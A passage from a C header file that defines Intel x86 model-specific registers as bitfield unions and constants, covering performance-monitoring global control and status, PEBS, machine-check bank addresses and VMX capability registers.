        UINT64 OvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_BIT                          62
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_FLAG                         0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF_MASK                         0x01
#define IA32_PERF_GLOBAL_STATUS_OVF_BUF(_)                           (((_) >> 62) & 0x01)

        /**
         * [Bit 63] CondChgd: Status bits of this register have changed.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 0
         */
        UINT64 CondChgd : 1;
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_BIT                        63
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_FLAG                       0x8000000000000000
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD_MASK                       0x01
#define IA32_PERF_GLOBAL_STATUS_COND_CHGD(_)                         (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_REGISTER;


/**
 * @brief Global Performance Counter Control <b>(R/W)</b>
 *
 * Global Performance Counter Control. Counter increments while the result of ANDing the respective enable bit in this MSR
 * with the corresponding OS or USR bits in the general-purpose or fixed counter control MSR is true.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 0
 */
#define IA32_PERF_GLOBAL_CTRL                                        0x0000038F
typedef struct
{
    /**
     * EN_PMC(n). Enable bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EAX[15:8] > n
     */
    UINT32 EnPmcn;

    /**
     * EN_FIXED_CTR(n). Enable bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
     *
     * @remarks If CPUID.0AH: EDX[4:0] > n
     */
    UINT32 EnFixedCtrn;
} IA32_PERF_GLOBAL_CTRL_REGISTER;


/**
 * Global Performance Counter Overflow Reset Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_STATUS_RESET                                0x00000390
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] Set 1 to clear Ovf_PMC(n) bit. Clear bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > n
         */
        UINT64 ClearOvfPmcn : 32;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_BIT             0
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_FLAG            0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN_MASK            0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_PMCN(_)              (((_) >> 0) & 0xFFFFFFFF)

        /**
         * [Bits 34:32] Set 1 to clear Ovf_FIXED_CTR(n) bit. Clear bitmask. Only the first n-1 bits are valid. Bits 31:n are
         * reserved.
         *
         * @remarks If CPUID.0AH: EDX[4:0] > n
         */
        UINT64 ClearOvfFixedCtrn : 3;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_BIT       32
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_FLAG      0x700000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN_MASK      0x07
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_FIXED_CTRN(_)        (((_) >> 32) & 0x07)
        UINT64 Reserved1 : 20;

        /**
         * [Bit 55] Set 1 to clear Trace_ToPA_PMI bit.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && IA32_RTIT_CTL.ToPA = 1
         */
        UINT64 ClearTraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_BIT       55
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_FLAG      0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI_MASK      0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_TRACE_TOPA_PMI(_)        (((_) >> 55) & 0x01)
        UINT64 Reserved2 : 2;

        /**
         * [Bit 58] Set 1 to clear LBR_Frz bit.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 ClearLbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_BIT              58
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_FLAG             0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ_MASK             0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_LBR_FRZ(_)               (((_) >> 58) & 0x01)

        /**
         * [Bit 59] Set 1 to clear CTR_Frz bit.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 ClearCtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_BIT              59
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_FLAG             0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ_MASK             0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_CTR_FRZ(_)               (((_) >> 59) & 0x01)

        /**
         * [Bit 60] Set 1 to clear ASCI bit.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 ClearAsci : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_BIT                 60
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_FLAG                0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI_MASK                0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_ASCI(_)                  (((_) >> 60) & 0x01)

        /**
         * [Bit 61] Set 1 to clear Ovf_Uncore bit.
         *
         * @remarks 06_2EH
         */
        UINT64 ClearOvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_BIT           61
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_FLAG          0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE_MASK          0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_UNCORE(_)            (((_) >> 61) & 0x01)

        /**
         * [Bit 62] Set 1 to clear OvfBuf bit.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 0
         */
        UINT64 ClearOvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_BIT              62
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_FLAG             0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF_MASK             0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_OVF_BUF(_)               (((_) >> 62) & 0x01)

        /**
         * [Bit 63] Set 1 to clear CondChgd bit.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 0
         */
        UINT64 ClearCondChgd : 1;
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_BIT            63
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_FLAG           0x8000000000000000
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD_MASK           0x01
#define IA32_PERF_GLOBAL_STATUS_RESET_CLEAR_COND_CHGD(_)             (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_RESET_REGISTER;


/**
 * Global Performance Counter Overflow Set Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_STATUS_SET                                  0x00000391
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] Set 1 to cause Ovf_PMC(n) = 1. Set bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > n
         */
        UINT64 OvfPmcn : 32;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_BIT                     0
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_FLAG                    0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN_MASK                    0xFFFFFFFF
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_PMCN(_)                      (((_) >> 0) & 0xFFFFFFFF)

        /**
         * [Bits 34:32] Set 1 to cause Ovf_FIXED_CTR(n) = 1. Set bitmask. Only the first n-1 bits are valid. Bits 31:n are
         * reserved.
         *
         * @remarks If CPUID.0AH: EDX[4:0] > n
         */
        UINT64 OvfFixedCtrn : 3;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_BIT               32
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_FLAG              0x700000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN_MASK              0x07
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_FIXED_CTRN(_)                (((_) >> 32) & 0x07)
        UINT64 Reserved1 : 20;

        /**
         * [Bit 55] Set 1 to cause Trace_ToPA_PMI = 1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 TraceTopaPmi : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_BIT               55
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_FLAG              0x80000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI_MASK              0x01
#define IA32_PERF_GLOBAL_STATUS_SET_TRACE_TOPA_PMI(_)                (((_) >> 55) & 0x01)
        UINT64 Reserved2 : 2;

        /**
         * [Bit 58] Set 1 to cause LBR_Frz = 1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 LbrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_BIT                      58
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_FLAG                     0x400000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ_MASK                     0x01
#define IA32_PERF_GLOBAL_STATUS_SET_LBR_FRZ(_)                       (((_) >> 58) & 0x01)

        /**
         * [Bit 59] Set 1 to cause CTR_Frz = 1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 CtrFrz : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_BIT                      59
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_FLAG                     0x800000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ_MASK                     0x01
#define IA32_PERF_GLOBAL_STATUS_SET_CTR_FRZ(_)                       (((_) >> 59) & 0x01)

        /**
         * [Bit 60] Set 1 to cause ASCI = 1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 Asci : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_BIT                         60
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_FLAG                        0x1000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI_MASK                        0x01
#define IA32_PERF_GLOBAL_STATUS_SET_ASCI(_)                          (((_) >> 60) & 0x01)

        /**
         * [Bit 61] Set 1 to cause Ovf_Uncore = 1.
         *
         * @remarks 06_2EH
         */
        UINT64 OvfUncore : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_BIT                   61
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_FLAG                  0x2000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE_MASK                  0x01
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_UNCORE(_)                    (((_) >> 61) & 0x01)

        /**
         * [Bit 62] Set 1 to cause OvfBuf = 1.
         *
         * @remarks If CPUID.0AH: EAX[7:0] > 3
         */
        UINT64 OvfBuf : 1;
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_BIT                      62
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_FLAG                     0x4000000000000000
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF_MASK                     0x01
#define IA32_PERF_GLOBAL_STATUS_SET_OVF_BUF(_)                       (((_) >> 62) & 0x01)
        UINT64 Reserved3 : 1;
    };

    UINT64 Flags;
} IA32_PERF_GLOBAL_STATUS_SET_REGISTER;


/**
 * Indicator that core perfmon interface is in use.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PERF_GLOBAL_INUSE                                       0x00000392
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] IA32_PERFEVTSEL(n) in use. Status bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
         *
         * @remarks If CPUID.0AH: EAX[15:8] > n
         */
        UINT64 Ia32PerfevtselnInUse : 32;
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_BIT           0
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_FLAG          0xFFFFFFFF
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE_MASK          0xFFFFFFFF
#define IA32_PERF_GLOBAL_INUSE_IA32_PERFEVTSELN_IN_USE(_)            (((_) >> 0) & 0xFFFFFFFF)

        /**
         * [Bits 34:32] IA32_FIXED_CTR(n) in use. Status bitmask. Only the first n-1 bits are valid. Bits 31:n are reserved.
         */
        UINT64 Ia32FixedCtrnInUse : 3;
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_BIT            32
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_FLAG           0x700000000
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE_MASK           0x07
#define IA32_PERF_GLOBAL_INUSE_IA32_FIXED_CTRN_IN_USE(_)             (((_) >> 32) & 0x07)
        UINT64 Reserved1 : 28;

        /**
         * [Bit 63] PMI in use.
         */
        UINT64 PmiInUse : 1;
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_BIT                        63
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_FLAG                       0x8000000000000000
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE_MASK                       0x01
#define IA32_PERF_GLOBAL_INUSE_PMI_IN_USE(_)                         (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} IA32_PERF_GLOBAL_INUSE_REGISTER;


/**
 * PEBS Control.
 *
 * @remarks If CPUID.0AH: EAX[7:0] > 3
 */
#define IA32_PEBS_ENABLE                                             0x000003F1
typedef union
{
    struct
    {
        /**
         * [Bit 0] Enable PEBS on IA32_PMC0.
         *
         * @remarks 06_0FH
         */
        UINT64 EnablePebs : 1;
#define IA32_PEBS_ENABLE_ENABLE_PEBS_BIT                             0
#define IA32_PEBS_ENABLE_ENABLE_PEBS_FLAG                            0x01
#define IA32_PEBS_ENABLE_ENABLE_PEBS_MASK                            0x01
#define IA32_PEBS_ENABLE_ENABLE_PEBS(_)                              (((_) >> 0) & 0x01)

        /**
         * [Bits 3:1] Reserved or model specific.
         */
        UINT64 Reservedormodelspecific1 : 3;
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_BIT                1
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_FLAG               0x0E
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1_MASK               0x07
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC1(_)                 (((_) >> 1) & 0x07)
        UINT64 Reserved1 : 28;

        /**
         * [Bits 35:32] Reserved or model specific.
         */
        UINT64 Reservedormodelspecific2 : 4;
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_BIT                32
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_FLAG               0xF00000000
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2_MASK               0x0F
#define IA32_PEBS_ENABLE_RESERVEDORMODELSPECIFIC2(_)                 (((_) >> 32) & 0x0F)
        UINT64 Reserved2 : 28;
    };

    UINT64 Flags;
} IA32_PEBS_ENABLE_REGISTER;

/**
 * @defgroup IA32_MC_CTL \
 *           IA32_MC(i)_CTL
 *
 * IA32_MC(0-28)_CTL.
 *
 * @remarks If IA32_MCG_CAP.CNT > n
 * @{
 */
#define IA32_MC0_CTL                                                 0x00000400
#define IA32_MC1_CTL                                                 0x00000404
#define IA32_MC2_CTL                                                 0x00000408
#define IA32_MC3_CTL                                                 0x0000040C
#define IA32_MC4_CTL                                                 0x00000410
#define IA32_MC5_CTL                                                 0x00000414
#define IA32_MC6_CTL                                                 0x00000418
#define IA32_MC7_CTL                                                 0x0000041C
#define IA32_MC8_CTL                                                 0x00000420
#define IA32_MC9_CTL                                                 0x00000424
#define IA32_MC10_CTL                                                0x00000428
#define IA32_MC11_CTL                                                0x0000042C
#define IA32_MC12_CTL                                                0x00000430
#define IA32_MC13_CTL                                                0x00000434
#define IA32_MC14_CTL                                                0x00000438
#define IA32_MC15_CTL                                                0x0000043C
#define IA32_MC16_CTL                                                0x00000440
#define IA32_MC17_CTL                                                0x00000444
#define IA32_MC18_CTL                                                0x00000448
#define IA32_MC19_CTL                                                0x0000044C
#define IA32_MC20_CTL                                                0x00000450
#define IA32_MC21_CTL                                                0x00000454
#define IA32_MC22_CTL                                                0x00000458
#define IA32_MC23_CTL                                                0x0000045C
#define IA32_MC24_CTL                                                0x00000460
#define IA32_MC25_CTL                                                0x00000464
#define IA32_MC26_CTL                                                0x00000468
#define IA32_MC27_CTL                                                0x0000046C
#define IA32_MC28_CTL                                                0x00000470
 /**
  * @}
  */

  /**
   * @defgroup IA32_MC_STATUS \
   *           IA32_MC(i)_STATUS
   *
   * IA32_MC(0-28)_STATUS.
   *
   * @remarks If IA32_MCG_CAP.CNT > n
   * @{
   */
#define IA32_MC0_STATUS                                              0x00000401
#define IA32_MC1_STATUS                                              0x00000405
#define IA32_MC2_STATUS                                              0x00000409
#define IA32_MC3_STATUS                                              0x0000040D
#define IA32_MC4_STATUS                                              0x00000411
#define IA32_MC5_STATUS                                              0x00000415
#define IA32_MC6_STATUS                                              0x00000419
#define IA32_MC7_STATUS                                              0x0000041D
#define IA32_MC8_STATUS                                              0x00000421
#define IA32_MC9_STATUS                                              0x00000425
#define IA32_MC10_STATUS                                             0x00000429
#define IA32_MC11_STATUS                                             0x0000042D
#define IA32_MC12_STATUS                                             0x00000431
#define IA32_MC13_STATUS                                             0x00000435
#define IA32_MC14_STATUS                                             0x00000439
#define IA32_MC15_STATUS                                             0x0000043D
#define IA32_MC16_STATUS                                             0x00000441
#define IA32_MC17_STATUS                                             0x00000445
#define IA32_MC18_STATUS                                             0x00000449
#define IA32_MC19_STATUS                                             0x0000044D
#define IA32_MC20_STATUS                                             0x00000451
#define IA32_MC21_STATUS                                             0x00000455
#define IA32_MC22_STATUS                                             0x00000459
#define IA32_MC23_STATUS                                             0x0000045D
#define IA32_MC24_STATUS                                             0x00000461
#define IA32_MC25_STATUS                                             0x00000465
#define IA32_MC26_STATUS                                             0x00000469
#define IA32_MC27_STATUS                                             0x0000046D
#define IA32_MC28_STATUS                                             0x00000471
   /**
    * @}
    */

    /**
     * @defgroup IA32_MC_ADDR \
     *           IA32_MC(i)_ADDR
     *
     * IA32_MC(0-28)_ADDR.
     *
     * @remarks If IA32_MCG_CAP.CNT > n
     * @{
     */
#define IA32_MC0_ADDR                                                0x00000402
#define IA32_MC1_ADDR                                                0x00000406
#define IA32_MC2_ADDR                                                0x0000040A
#define IA32_MC3_ADDR                                                0x0000040E
#define IA32_MC4_ADDR                                                0x00000412
#define IA32_MC5_ADDR                                                0x00000416
#define IA32_MC6_ADDR                                                0x0000041A
#define IA32_MC7_ADDR                                                0x0000041E
#define IA32_MC8_ADDR                                                0x00000422
#define IA32_MC9_ADDR                                                0x00000426
#define IA32_MC10_ADDR                                               0x0000042A
#define IA32_MC11_ADDR                                               0x0000042E
#define IA32_MC12_ADDR                                               0x00000432
#define IA32_MC13_ADDR                                               0x00000436
#define IA32_MC14_ADDR                                               0x0000043A
#define IA32_MC15_ADDR                                               0x0000043E
#define IA32_MC16_ADDR                                               0x00000442
#define IA32_MC17_ADDR                                               0x00000446
#define IA32_MC18_ADDR                                               0x0000044A
#define IA32_MC19_ADDR                                               0x0000044E
#define IA32_MC20_ADDR                                               0x00000452
#define IA32_MC21_ADDR                                               0x00000456
#define IA32_MC22_ADDR                                               0x0000045A
#define IA32_MC23_ADDR                                               0x0000045E
#define IA32_MC24_ADDR                                               0x00000462
#define IA32_MC25_ADDR                                               0x00000466
#define IA32_MC26_ADDR                                               0x0000046A
#define IA32_MC27_ADDR                                               0x0000046E
#define IA32_MC28_ADDR                                               0x00000472
     /**
      * @}
      */

      /**
       * @defgroup IA32_MC_MISC \
       *           IA32_MC(i)_MISC
       *
       * IA32_MC(0-28)_MISC.
       *
       * @remarks If IA32_MCG_CAP.CNT > n
       * @{
       */
#define IA32_MC0_MISC                                                0x00000403
#define IA32_MC1_MISC                                                0x00000407
#define IA32_MC2_MISC                                                0x0000040B
#define IA32_MC3_MISC                                                0x0000040F
#define IA32_MC4_MISC                                                0x00000413
#define IA32_MC5_MISC                                                0x00000417
#define IA32_MC6_MISC                                                0x0000041B
#define IA32_MC7_MISC                                                0x0000041F
#define IA32_MC8_MISC                                                0x00000423
#define IA32_MC9_MISC                                                0x00000427
#define IA32_MC10_MISC                                               0x0000042B
#define IA32_MC11_MISC                                               0x0000042F
#define IA32_MC12_MISC                                               0x00000433
#define IA32_MC13_MISC                                               0x00000437
#define IA32_MC14_MISC                                               0x0000043B
#define IA32_MC15_MISC                                               0x0000043F
#define IA32_MC16_MISC                                               0x00000443
#define IA32_MC17_MISC                                               0x00000447
#define IA32_MC18_MISC                                               0x0000044B
#define IA32_MC19_MISC                                               0x0000044F
#define IA32_MC20_MISC                                               0x00000453
#define IA32_MC21_MISC                                               0x00000457
#define IA32_MC22_MISC                                               0x0000045B
#define IA32_MC23_MISC                                               0x0000045F
#define IA32_MC24_MISC                                               0x00000463
#define IA32_MC25_MISC                                               0x00000467
#define IA32_MC26_MISC                                               0x0000046B
#define IA32_MC27_MISC                                               0x0000046F
#define IA32_MC28_MISC                                               0x00000473
       /**
        * @}
        */


        /**
         * Reporting Register of Basic VMX Capabilities.
         *
         * @remarks If CPUID.01H:ECX.[5] = 1
         * @see Vol3D[A.1(BASIC VMX INFORMATION)]
         * @see Vol3D[A.1(Basic VMX Information)] (reference)
         */
#define IA32_VMX_BASIC                                               0x00000480
typedef union
{
    struct
    {
        /**
         * @brief VMCS revision identifier used by the processor
         *
         * [Bits 30:0] 31-bit VMCS revision identifier used by the processor. Processors that use the same VMCS revision identifier
         * use the same size for VMCS regions.
         */
        UINT64 VmcsRevisionId : 31;
#define IA32_VMX_BASIC_VMCS_REVISION_ID_BIT                          0
#define IA32_VMX_BASIC_VMCS_REVISION_ID_FLAG                         0x7FFFFFFF
#define IA32_VMX_BASIC_VMCS_REVISION_ID_MASK                         0x7FFFFFFF
#define IA32_VMX_BASIC_VMCS_REVISION_ID(_)                           (((_) >> 0) & 0x7FFFFFFF)

        /**
         * [Bit 31] Bit 31 is always 0.
         */
        UINT64 MustBeZero : 1;
#define IA32_VMX_BASIC_MUST_BE_ZERO_BIT                              31
#define IA32_VMX_BASIC_MUST_BE_ZERO_FLAG                             0x80000000
#define IA32_VMX_BASIC_MUST_BE_ZERO_MASK                             0x01
#define IA32_VMX_BASIC_MUST_BE_ZERO(_)                               (((_) >> 31) & 0x01)

        /**
         * @brief Size of the VMCS
         *
         * [Bits 44:32] Report the number of bytes that software should allocate for the VMXON region and any VMCS region. It is a
         * value greater than 0 and at most 4096 (bit 44 is set if and only if bits 43:32 are clear).
         */
        UINT64 VmcsSizeInBytes : 13;
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_BIT                        32
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_FLAG                       0x1FFF00000000
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES_MASK                       0x1FFF
#define IA32_VMX_BASIC_VMCS_SIZE_IN_BYTES(_)                         (((_) >> 32) & 0x1FFF)
        UINT64 Reserved1 : 3;

        /**
         * @brief Width of physical address used for the VMCS
         *        - 0 -> limited to the available amount of physical RAM
         *        - 1 -> within the first 4 GB
         *
         * [Bit 48] Indicates the width of the physical addresses that may be used for the VMXON region, each VMCS, and data
         * structures referenced by pointers in a VMCS (I/O bitmaps, virtual-APIC page, MSR areas for VMX transitions). If the bit
         * is 0, these addresses are limited to the processor's physical-address width.2 If the bit is 1, these addresses are
         * limited to 32 bits. This bit is always 0 for processors that support Intel 64 architecture.
         */
        UINT64 VmcsPhysicalAddressWidth : 1;
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_BIT               48
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_FLAG              0x1000000000000
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH_MASK              0x01
#define IA32_VMX_BASIC_VMCS_PHYSICAL_ADDRESS_WIDTH(_)                (((_) >> 48) & 0x01)

        /**
         * @brief Whether the processor supports the dual-monitor treatment of system-management interrupts and system-management
         *        code (always 1)
         *
         * [Bit 49] Read as 1, the logical processor supports the dual-monitor treatment of system-management interrupts and
         * system-management mode.
         *
         * @see Vol3C[34.15(DUAL-MONITOR TREATMENT OF SMIs AND SMM)]
         */
        UINT64 DualMonitorSupport : 1;
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_BIT                      49
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_FLAG                     0x2000000000000
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT_MASK                     0x01
#define IA32_VMX_BASIC_DUAL_MONITOR_SUPPORT(_)                       (((_) >> 49) & 0x01)

        /**
         * @brief Memory type that must be used for the VMCS
         *
         * [Bits 53:50] Report the memory type that should be used for the VMCS, for data structures referenced by pointers in the
         * VMCS (I/O bitmaps, virtual-APIC page, MSR areas for VMX transitions), and for the MSEG header. If software needs to
         * access these data structures (e.g., to modify the contents of the MSR bitmaps), it can configure the paging structures
         * to map them into the linear-address space. If it does so, it should establish mappings that use the memory type reported
         * bits 53:50 in this MSR.
         * As of this writing, all processors that support VMX operation indicate the write-back type.
         */
        UINT64 MemoryType : 4;
#define IA32_VMX_BASIC_MEMORY_TYPE_BIT                               50
#define IA32_VMX_BASIC_MEMORY_TYPE_FLAG                              0x3C000000000000
#define IA32_VMX_BASIC_MEMORY_TYPE_MASK                              0x0F
#define IA32_VMX_BASIC_MEMORY_TYPE(_)                                (((_) >> 50) & 0x0F)

        /**
         * @brief Whether the processor provides additional information for exits due to INS/OUTS
         *
         * [Bit 54] When set to 1, the processor reports information in the VM-exit instruction-information field on VM exits due
         * to execution of the INS and OUTS instructions. This reporting is done only if this bit is read as 1.
         *
         * @see Vol3C[27.2.4(Information for VM Exits Due to Instruction Execution)]
         */
        UINT64 InsOutsReporting : 1;
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_BIT                        54
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_FLAG                       0x40000000000000
#define IA32_VMX_BASIC_INS_OUTS_REPORTING_MASK                       0x01
#define IA32_VMX_BASIC_INS_OUTS_REPORTING(_)                         (((_) >> 54) & 0x01)

        /**
         * @brief Whether default 1 bits in control MSRs (pin/proc/exit/entry) may be cleared to 0 and that 'true' control MSRs are
         *        supported
         *
         * [Bit 55] Is read as 1 if any VMX controls that default to 1 may be cleared to 0. It also reports support for the VMX
         * capability MSRs IA32_VMX_TRUE_PINBASED_CTLS, IA32_VMX_TRUE_PROCBASED_CTLS, IA32_VMX_TRUE_EXIT_CTLS, and
         * IA32_VMX_TRUE_ENTRY_CTLS.
         *
         * @see Vol3D[A.2(RESERVED CONTROLS AND DEFAULT SETTINGS)]
         * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
         * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
         * @see Vol3D[A.4(VM-EXIT CONTROLS)]
         * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
         */
        UINT64 VmxControls : 1;
#define IA32_VMX_BASIC_VMX_CONTROLS_BIT                              55
#define IA32_VMX_BASIC_VMX_CONTROLS_FLAG                             0x80000000000000
#define IA32_VMX_BASIC_VMX_CONTROLS_MASK                             0x01
#define IA32_VMX_BASIC_VMX_CONTROLS(_)                               (((_) >> 55) & 0x01)
        UINT64 Reserved2 : 8;
    };

    UINT64 Flags;
} IA32_VMX_BASIC_REGISTER;


/**
 * Capability Reporting Register of Pin-Based VM-Execution Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
 * @see Vol3C[24.6.1(Pin-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PINBASED_CTLS                                       0x00000481
typedef union
{
    struct
    {
        /**
         * @brief External interrupts cause VM-exits if set; otherwise dispatched through the guest's IDT
         *
         * [Bit 0] If this control is 1, external interrupts cause VM exits. Otherwise, they are delivered normally through the
         * guest interrupt-descriptor table (IDT). If this control is 1, the value of RFLAGS.IF does not affect interrupt blocking.
         */
        UINT64 ExternalInterruptExiting : 1;
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_BIT        0
